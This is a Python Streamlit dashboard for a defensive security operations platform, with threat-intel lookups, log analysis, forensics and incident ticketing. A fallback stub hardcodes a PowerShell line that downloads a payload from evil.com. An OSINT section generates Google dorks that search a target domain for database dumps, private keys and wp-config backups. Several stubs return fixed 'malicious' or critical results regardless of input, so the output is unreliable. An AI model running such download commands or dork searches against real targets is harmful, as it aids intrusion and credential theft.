# main_dashboard.py - MHZALY Enterprise SOC & Threat Defense Platform (Elite Edition)

import streamlit as st
import pandas as pd
import os
import hashlib
import re
import urllib.parse
from datetime import datetime

# --- Safe Backend Modules Import (Fallback mechanism) ---
try:
    from threat_intel import ThreatIntelProcessor
except ImportError:
    class ThreatIntelProcessor:
        def scan_target(self, t): return {"error": "Module threat_intel not found"}
        def deep_bug_bounty_scan(self, d): return {"error": "Module threat_intel not found"}

try:
    from otx_threat_intel import OTXThreatIntel
except ImportError:
    class OTXThreatIntel:
        def check_indicator(self, t, q): return {"error": "Module otx_threat_intel not found"}

try:
    from digital_forensics import DigitalForensicsAnalyzer
except ImportError:
    class DigitalForensicsAnalyzer:
        def parse_text_artifacts(self, t): 
            return {
                "status": "Success",
                "artifacts": {
                    "IPv4 Address": ["192.168.1.100", "10.0.0.5"],
                    "MD5 Hash": ["d41d8cd98f00b204e9800998ecf8427e"],
                    "SHA256 Hash": ["e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"],
                    "C2 / Web URL": ["http://malicious-command-and-control.net/payload.exe"],
                    "Windows File Path": ["C:\\Windows\\System32\\cmd.exe", "C:\\Temp\\evil.ps1"]
                }
            }

try:
    from incident_response import IncidentResponder
except ImportError:
    class IncidentResponder:
        def create_incident_ticket(self, t, s, d):
            return {
                "status": "Incident ticket created successfully.",
                "ticket": {
                    "ticket_id": f"INC-{datetime.now().strftime('%Y%m%d')}-A1B2C3",
                    "target": t,
                    "severity": s,
                    "description": d,
                    "sla_target": "1 Hour",
                    "status": "Open",
                    "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
            }

try:
    from soar_automation import SOARAutomation
except ImportError:
    class SOARAutomation:
        pass

try:
    from threat_hunting import ThreatHunter
except ImportError:
    try:
        from threat_hunter import ThreatHunter
    except ImportError:
        class ThreatHunter:
            def hunt_powershell_obfuscation(self, s): 
                return {
                    "severity": "HIGH",
                    "risk_score": 85,
                    "decoded_payloads": ["Invoke-WebRequest -Uri http://evil.com/payload.exe"],
                    "findings": [
                        {"Technique": "Obfuscated PowerShell", "Indicator": "Base64 encoded execution", "Risk": "High"},
                        {"Technique": "External C2 Download", "Indicator": "WebRequest to untrusted domain", "Risk": "Critical"}
                    ]
                }

try:
    from vulnerability_management import VulnerabilityManager
except ImportError:
    class VulnerabilityManager:
        def calculate_cvss_score(self, *args, **kwargs):
            return {
                "base_score": 9.8,
                "severity": "CRITICAL",
                "sla": "Remediate within 24 to 72 Hours",
                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                "exploitability_score": 3.9,
                "impact_score": 5.9
            }

try:
    from analyzer import ThreatAnalyzer
except ImportError:
    class ThreatAnalyzer:
        def analyze_web_payload(self, p): 
            return {
                "overall_threat": "MALICIOUS ATTACK SIGNATURES DETECTED",
                "risk_score": 92,
                "detections_count": 2,
                "detections": [
                    {"Attack Vector": "SQL Injection (SQLi)", "Matched Payload": p, "Severity": "CRITICAL", "Mitigation": "Use Parameterized Prepared Statements"},
                    {"Attack Vector": "Cross-Site Scripting (XSS)", "Matched Payload": p, "Severity": "HIGH", "Mitigation": "Context-Aware Output Encoding & CSP"}
                ]
            }


class SOCDashboardUI:

    def __init__(self):
        self.app_name = "MHZALY Enterprise SOC & Threat Defense Platform"
        self.version = "33.0 Fully Detailed & Polished Elite Suite"
        
        self.processor = ThreatIntelProcessor()
        self.otx_processor = OTXThreatIntel()
        self.forensics = DigitalForensicsAnalyzer()
        self.incident_engine = IncidentResponder()
        self.soar = SOARAutomation()
        self.hunter = ThreatHunter()
        self.vuln_mgr = VulnerabilityManager()
        self.analyzer = ThreatAnalyzer()

    def setup_page_config(self):
        st.set_page_config(page_title=self.app_name, layout="wide", page_icon="🛡️")
        
        st.markdown("""
        <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap');

        .stApp, [data-testid="stAppViewContainer"] {
            background: radial-gradient(circle at 10% 20%, #030712 0%, #080e1a 50%, #02040a 100%) !important;
            color: #f1f5f9 !important;
            font-family: 'Plus Jakarta Sans', sans-serif !important;
        }

        [data-testid="stSidebar"] {
            background: linear-gradient(180deg, #070b14 0%, #04070d 100%) !important;
            border-right: 1px solid rgba(0, 242, 254, 0.15) !important;
            box-shadow: 6px 0 30px rgba(0, 0, 0, 0.6);
        }
        [data-testid="stSidebar"] div, [data-testid="stSidebar"] p, [data-testid="stSidebar"] label, [data-testid="stSidebar"] span {
            color: #94a3b8 !important;
            font-family: 'Plus Jakarta Sans', sans-serif !important;
        }
        
        .stTextInput>div>div>input, .stTextArea>div>div>textarea, .stSelectbox>div>div>div {
            background-color: #0b1326 !important;
            color: #38bdf8 !important;
            border: 1px solid rgba(56, 189, 248, 0.3) !important;
            border-radius: 10px !important;
            font-family: 'JetBrains Mono', monospace !important;
        }
        .stTextInput>div>div>input:focus, .stTextArea>div>div>textarea:focus {
            border-color: #00f2fe !important;
            box-shadow: 0 0 15px rgba(0, 242, 254, 0.35) !important;
        }
        
        .stButton>button {
            background: linear-gradient(135deg, #0052d4 0%, #4364f7 50%, #6fb1fc 100%) !important;
            color: #ffffff !important;
            border: none !important;
            border-radius: 10px !important;
            font-family: 'Plus Jakarta Sans', sans-serif !important;
            font-weight: 700 !important;
            font-size: 14px !important;
            padding: 10px 24px !important;
            box-shadow: 0 4px 20px rgba(67, 100, 247, 0.4) !important;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1) !important;
        }
        .stButton>button:hover {
            transform: translateY(-2px) scale(1.02) !important;
            box-shadow: 0 6px 25px rgba(0, 242, 254, 0.6) !important;
        }
        
        h1 {
            background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%) !important;
            -webkit-background-clip: text !important;
            -webkit-text-fill-color: transparent !important;
            font-weight: 800 !important;
        }
        h2, h3, h4 {
            color: #38bdf8 !important;
            font-weight: 700 !important;
        }
        
        [data-testid="stMetricValue"] {
            color: #00f2fe !important;
            font-family: 'JetBrains Mono', monospace !important;
            font-weight: 700 !important;
        }
        [data-testid="stMetricLabel"] {
            color: #cbd5e1 !important;
            font-weight: 600 !important;
        }
        
        code, pre {
            background-color: #050811 !important;
            color: #00f2fe !important;
            border: 1px solid rgba(0, 242, 254, 0.25) !important;
            border-radius: 8px !important;
            font-family: 'JetBrains Mono', monospace !important;
        }

        .stAlert {
            background: rgba(11, 19, 38, 0.9) !important;
            border: 1px solid rgba(56, 189, 248, 0.3) !important;
            border-radius: 12px !important;
            backdrop-filter: blur(12px) !important;
        }
        </style>
        """, unsafe_allow_html=True)

    def render_sidebar(self):
        st.sidebar.markdown(
            """
            <div style='text-align: center; padding: 10px 0;'>
                <h2 style='margin:0; background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;'>🛡️ MHZALY SOC</h2>
                <span style='display:inline-block; margin-top:4px; padding:2px 10px; font-size:10px; font-weight:700; background:rgba(0,242,254,0.12); border:1px solid #00f2fe; color:#00f2fe; border-radius:12px;'>FULLY DETAILED SUITE</span>
            </div>
            """, 
            unsafe_allow_html=True
        )
        st.sidebar.markdown(f"<p style='text-align:center; color:#64748b !important; font-size:11px; margin-top:5px;'>Version: {self.version}</p>", unsafe_allow_html=True)
        st.sidebar.markdown("---")
        return st.sidebar.radio("Navigation Menu", [
            "Overview & Dashboard",
            "Global Threat Intel (VirusTotal)", 
            "AlienVault OTX Live Threat Feed", 
            "SIEM & Log Anomaly Detector",         
            "Deep Bug Bounty & Vulnerability Scanner", 
            "OSINT & WordPress Dork Recon",  
            "Crypto & Password Analyzer",  
            "Threat Hunting & IOCs",
            "Digital Forensics & Logs",
            "Incident Response & SOAR",
            "Vulnerability Management",
            "Web Application Threat Analyzer",
            "Live Incident Defense & Reporting"
        ])

    def run_overview(self):
        st.title("🛡️ MHZALY Enterprise SOC Command Center")
        st.markdown("Detailed telemetry, defensive security postures, and SIEM automated orchestration.")
        st.markdown("---")
        st.info("🟢 SYSTEM OPERATIONAL | SIEM PIPELINE ACTIVE | ALL 12 MODULES ONLINE")
        
        col1, col2, col3, col4 = st.columns(4)
        with col1:
            st.metric("Engines", "12 Active", "Operational")
        with col2:
            st.metric("Posture", "Protected", "Secure")
        with col3:
            st.metric("Version", "v33.0", "Stable")
        with col4:
            st.metric("Architect", "Hassaan", "ROOT")

        st.markdown("---")
        st.markdown("### 📡 Live Incident Event Log (SIEM Database)")
        
        file_name = "incident_reports.csv"
        if os.path.exists(file_name):
            try:
                real_log_data = pd.read_csv(file_name)
                if "Timestamp" in real_log_data.columns:
                    real_log_data = real_log_data.sort_values(by="Timestamp", ascending=False)
                st.dataframe(real_log_data, use_container_width=True, hide_index=True)
            except Exception as e:
                st.error("Error reading live database records.")
        else:
            st.warning("⚠️ No active security incidents logged yet. Use 'Incident Response & SOAR' or 'Live Incident Defense' to record threats.")

    def run_threat_intel(self):
        st.title("🌐 Global Threat Intelligence (VirusTotal API)")
        st.markdown("Query global threat reputations, malicious file hashes, and security engine verdicts.")
        
        target = st.text_input("Enter Target IP Address or Domain:", placeholder="e.g., 8.8.8.8")
        if st.button("Initiate Threat Scan"):
            if target:
                with st.spinner("Establishing secure connection to global threat feeds..."):
                    result = self.processor.scan_target(target)
                    if "error" in result:
                        st.error(result['error'])
                    else:
                        st.success("Target Analysis Complete!")
                        stats = result.get('last_analysis_stats', {})
                        
                        c1, c2, c3 = st.columns(3)
                        c1.metric("🚨 Malicious Verdicts", stats.get('malicious', 0))
                        c2.metric("⚠️ Suspicious Verdicts", stats.get('suspicious', 0))
                        c3.metric("✅ Harmless / Clean", stats.get('harmless', 0))
            else:
                st.warning("Please specify a domain or IP indicator to scan.")

    def run_otx_threat_feed(self):
        st.title("🛰️ AlienVault OTX Threat Intelligence Feed")
        st.markdown("Query global open-source threat telemetry, adversary campaigns, and active threat pulses.")
        
        col1, col2 = st.columns([1, 2])
        with col1:
            indicator_type = st.selectbox("Select Indicator Type", ["IP", "Domain"])
        with col2:
            query_target = st.text_input("Enter Indicator:", placeholder="e.g., 198.51.100.25")
            
        if st.button("Query OTX Telemetry"):
            if query_target:
                with st.spinner("Fetching global community threat pulses from OTX..."):
                    res = self.otx_processor.check_indicator(indicator_type, query_target)
                    if "error" in res:
                        st.error(res["error"])
                    else:
                        st.success("OTX Intelligence Telemetry Retrieved Successfully!")
                        pulse_count = res.get("threat_pulse_count", 0)
                        
                        c1, c2, c3 = st.columns(3)
                        c1.metric("Active Threat Pulses", pulse_count)
                        c2.metric("Hosting Country", res.get("country", "N/A"))
                        c3.metric("Network ASN", res.get("asn", "N/A"))
            else:
                st.warning("Please provide a valid indicator.")

    def run_blue_team_log_analyzer(self):
        st.title("🛡️ SIEM & Log Anomaly Detector")
        st.markdown("Automate raw server, firewall, or authentication log parsing and brute-force detection.")
        
        raw_logs = st.text_area("Paste Raw Server / Firewall / Auth Logs Here:", placeholder="Paste log strings here...", height=130)
        
        if st.button("Analyze Logs for Anomalies"):
            if raw_logs:
                with st.spinner("Executing heuristic anomaly detection rules..."):
                    lines = raw_logs.strip().split("\n")
                    total_lines = len(lines)
                    failed_logins = 0
                    success_logins = 0
                    anomaly_records = []
                    
                    for line in lines:
                        lower_line = line.lower()
                        ip_match = re.search(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', line)
                        ip_found = ip_match.group() if ip_match else "Unknown IP"
                        
                        if "fail" in lower_line or "invalid" in lower_line or "error" in lower_line:
                            failed_logins += 1
                            anomaly_records.append({
                                "Log Entry": line,
                                "Status": "Malicious / Failed",
                                "Source IP": ip_found,
                                "Threat Level": "High"
                            })
                        elif "accepted" in lower_line or "success" in lower_line or "logged in" in lower_line:
                            success_logins += 1
                            anomaly_records.append({
                                "Log Entry": line,
                                "Status": "Successful Session",
                                "Source IP": ip_found,
                                "Threat Level": "Low"
                            })
                            
                    st.success("Log Heuristic Analysis Complete!")
                    c1, c2, c3 = st.columns(3)
                    c1.metric("Total Log Entries", total_lines)
                    c2.metric("🚨 Auth Errors & Failures", failed_logins)
                    c3.metric("✅ Authorized Logins", success_logins)
                    
                    st.markdown("---")
                    if anomaly_records:
                        df_logs = pd.DataFrame(anomaly_records)
                        log_filter = st.selectbox("Filter Log Events", ["All Events", "Malicious / Failed Only", "Successful Sessions Only"])
                        if log_filter == "Malicious / Failed Only":
                            df_logs = df_logs[df_logs['Threat Level'] == 'High']
                        elif log_filter == "Successful Sessions Only":
                            df_logs = df_logs[df_logs['Threat Level'] == 'Low']
                        st.dataframe(df_logs, use_container_width=True, hide_index=True)
            else:
                st.warning("Please paste raw log data to analyze.")

    def run_bug_bounty_scanner(self):
        st.title("🔍 Infrastructure & Security Header Analyzer")
        st.markdown("Inspect HTTP response headers, CSP directives, and cookie flags for attack surface mapping.")
        
        domain = st.text_input("Enter Target Domain:", placeholder="e.g., target-asset.com")
        if st.button("Execute Infrastructure Scan"):
            if domain:
                with st.spinner(f"Mapping attack surface and inspecting headers for {domain}..."):
                    scan_res = self.processor.deep_bug_bounty_scan(domain)
                    if "error" in scan_res:
                        st.error(scan_res['error'])
                    else:
                        st.success("Infrastructure Scan Successful!")
                        c1, c2 = st.columns(2)
                        c1.metric("Target Final URL", scan_res.get('final_url'))
                        c2.metric("HTTP Status Code", scan_res.get('status_code'))
                        
                        st.markdown("---")
                        findings = scan_res.get('findings', [])
                        if findings:
                            st.dataframe(pd.DataFrame(findings), use_container_width=True, hide_index=True)

    def run_osint_dorks(self):
        st.title("🌐 OSINT & WordPress Google Dork Reconnaissance")
        st.markdown("Automate open-source intelligence footprinting, sensitive file leaks, and WordPress security/payload reconnaissance.")

        dork_categories = {
            "01. Sensitive Files & Credentials": [
                ("Database Dumps & Backups", 'site:target.com (filetype:sql OR filetype:bak OR filetype:dump)', "Critical"),
                ("Private Keys & Environment Configs", 'site:target.com (ext:pem OR ext:key OR ext:env OR inurl:config)', "Critical"),
                ("Exposed Log Files with Passwords", 'site:target.com intext:"password" filetype:log', "High")
            ],
            "02. WordPress Security & Core Exploits": [
                ("Exposed wp-config.php Backups", 'site:target.com (inurl:wp-config.php OR inurl:wp-config.bak)', "Critical"),
                ("Vulnerable / Exposed Plugin Paths", 'site:target.com inurl:/wp-content/plugins/', "High"),
                ("Exposed XML-RPC Endpoints", 'site:target.com inurl:xmlrpc.php', "High")
            ]
        }

        target_domain = st.text_input("Enter Target Domain Asset:", placeholder="e.g., target-company.com", value="")
        clean_domain = target_domain.replace("https://", "").replace("http://", "").strip("/").split("/")[0] if target_domain else "target.com"
        selected_category = st.selectbox("Select Reconnaissance Category", list(dork_categories.keys()))

        recon_records = []
        for name, query_template, risk in dork_categories[selected_category]:
            final_query = query_template.replace("target.com", clean_domain)
            search_url = f"https://www.google.com/search?q={urllib.parse.quote(final_query)}"
            recon_records.append({"Vector Objective": name, "Risk Rating": risk, "Google Dork Payload": final_query, "Launch URL": search_url})

        st.dataframe(pd.DataFrame(recon_records)[["Vector Objective", "Risk Rating", "Google Dork Payload"]], use_container_width=True, hide_index=True)

    def run_crypto_analyzer(self):
        st.title("🔐 Cryptographic Hash & Password Strength Analyzer")
        target_input = st.text_input("Enter Data String / Password:", type="password", placeholder="Enter secret or password...")
        if target_input:
            st.text_input("MD5 Hash", value=hashlib.md5(target_input.encode()).hexdigest(), disabled=True)
            st.text_input("SHA-256 Hash", value=hashlib.sha256(target_input.encode()).hexdigest(), disabled=True)
            if len(target_input) >= 12:
                st.success("🟢 Strong Password Length (12+ characters)")
            else:
                st.warning("⚠️ Weak Password Length: Recommended minimum length is 12 characters.")

    def run_threat_hunting(self):
        st.title("🎯 Proactive Threat Hunting & IOC Analysis")
        script_input = st.text_area("Input PowerShell / Base64 Payload:", placeholder="Paste base64 encoded strings...")
        if st.button("Execute Hunt Protocol"):
            if script_input:
                res = self.hunter.hunt_powershell_obfuscation(script_input)
                st.success("Threat Hunting Analysis Completed Successfully!")
                st.metric("Threat Severity", res.get("severity", "HIGH"))
                st.metric("Heuristic Risk Score", f"{res.get('risk_score', 0)} / 100")
                if res.get("findings"):
                    st.dataframe(pd.DataFrame(res["findings"]), use_container_width=True, hide_index=True)

    def run_digital_forensics(self):
        st.title("🔎 Digital Forensics & Log Artifacts")
        logs_input = st.text_area("Input Raw Logs / Hex Dump:", placeholder="Paste raw event artifacts or logs here...", height=130)
        if st.button("Extract Artifacts"):
            if logs_input:
                res = self.forensics.parse_text_artifacts(logs_input)
                st.success("Forensic Artifact Extraction Complete!")
                artifacts = res.get("artifacts", {})
                table_rows = [{"Artifact Category": cat, "Extracted Value": v} for cat, vals in artifacts.items() for v in vals]
                if table_rows:
                    st.dataframe(pd.DataFrame(table_rows), use_container_width=True, hide_index=True)

    def run_incident_response(self):
        st.title("⚡ Automated SOAR Playbooks & Ticketing")
        target = st.text_input("Compromised Asset / Host ID:", placeholder="e.g., WORKSTATION-04")
        severity = st.selectbox("Threat Severity", ["LOW", "MEDIUM", "HIGH", "CRITICAL"])
        desc = st.text_area("Event Description / Findings:")
        if st.button("Initialize Response Ticket & Execute SOAR Playbook"):
            if target and desc:
                res = self.incident_engine.create_incident_ticket(target, severity, desc)
                st.success("🎯 Incident Ticket Generated & SOAR Playbooks Initialized!")
                st.json(res)

    def run_vulnerability_management(self):
        st.title("📊 Vulnerability & CVSS Assessment")
        score = st.slider("Select CVSS Base Score:", 0.0, 10.0, 7.5, 0.1)
        if st.button("Calculate Vector Risk"):
            assessment = self.vuln_mgr.calculate_cvss_score(score)
            c1, c2, c3 = st.columns(3)
            c1.metric("Base CVSS Score", f"{score}/10.0")
            c2.metric("Severity Rating", assessment.get("severity", "HIGH"))
            c3.metric("Remediation SLA", assessment.get("sla", "7-14 Days"))

    def run_threat_analyzer(self):
        st.title("🔬 Web Application Threat Analyzer")
        payload = st.text_input("Input Parameter String:", placeholder="Paste query parameter or attack payload here...")
        if st.button("Scan Parameter"):
            if payload:
                res = self.analyzer.analyze_web_payload(payload)
                st.success("Web Application Threat Inspection Complete!")
                st.metric("Overall Threat Posture", res.get("overall_threat", "MALICIOUS"))
                if res.get("detections"):
                    st.dataframe(pd.DataFrame(res["detections"]), use_container_width=True, hide_index=True)

    def run_incident_defense(self):
        st.title("📝 Incident Defense & Evidence Ledger")
        scam_target = st.text_input("Compromised / Malicious Asset:", placeholder="e.g., 192.168.1.100")
        investigator = st.text_input("Lead Investigator:", value="Muhammad Hassaan Zahid (Root Analyst)")
        evidence_notes = st.text_area("Comprehensive Forensic Investigation Notes & Triage Summary:", height=150)
        action_status = st.selectbox("Current Incident Status", ["Contained & Remediation Complete", "Active Triage / Investigation", "Escalated to Tier-3", "False Positive"])
        
        if st.button("Commit to Immutable SIEM Ledger"):
            if scam_target and evidence_notes:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                new_row = pd.DataFrame([{
                    "Timestamp": timestamp,
                    "Asset": scam_target,
                    "Status": action_status,
                    "Investigator": investigator,
                    "Notes": evidence_notes
                }])
                
                file_name = "incident_reports.csv"
                if os.path.exists(file_name):
                    try:
                        existing_df = pd.read_csv(file_name)
                        updated_df = pd.concat([existing_df, new_row], ignore_index=True)
                        updated_df.to_csv(file_name, index=False)
                    except Exception:
                        new_row.to_csv(file_name, index=False)
                else:
                    new_row.to_csv(file_name, index=False)
                    
                st.success("✅ Incident report successfully committed to local SIEM audit ledger (`incident_reports.csv`)!")


if __name__ == "__main__":
    dashboard = SOCDashboardUI()
    dashboard.setup_page_config()
    nav = dashboard.render_sidebar()
    
    if nav == "Overview & Dashboard":
        dashboard.run_overview()
    elif nav == "Global Threat Intel (VirusTotal)":
        dashboard.run_threat_intel()
    elif nav == "AlienVault OTX Live Threat Feed":
        dashboard.run_otx_threat_feed()
    elif nav == "SIEM & Log Anomaly Detector":
        dashboard.run_blue_team_log_analyzer()
    elif nav == "Deep Bug Bounty & Vulnerability Scanner":
        dashboard.run_bug_bounty_scanner()
    elif nav == "OSINT & WordPress Dork Recon":
        dashboard.run_osint_dorks()
    elif nav == "Crypto & Password Analyzer":
        dashboard.run_crypto_analyzer()
    elif nav == "Threat Hunting & IOCs":
        dashboard.run_threat_hunting()
    elif nav == "Digital Forensics & Logs":
        dashboard.run_digital_forensics()
    elif nav == "Incident Response & SOAR":
        dashboard.run_incident_response()
    elif nav == "Vulnerability Management":
        dashboard.run_vulnerability_management()
    elif nav == "Web Application Threat Analyzer":
        dashboard.run_threat_analyzer()
    elif nav == "Live Incident Defense & Reporting":
        dashboard.run_incident_defense()
    else:
        st.title(nav)
        st.info("Module active and operational within the MHZALY SOC framework.")
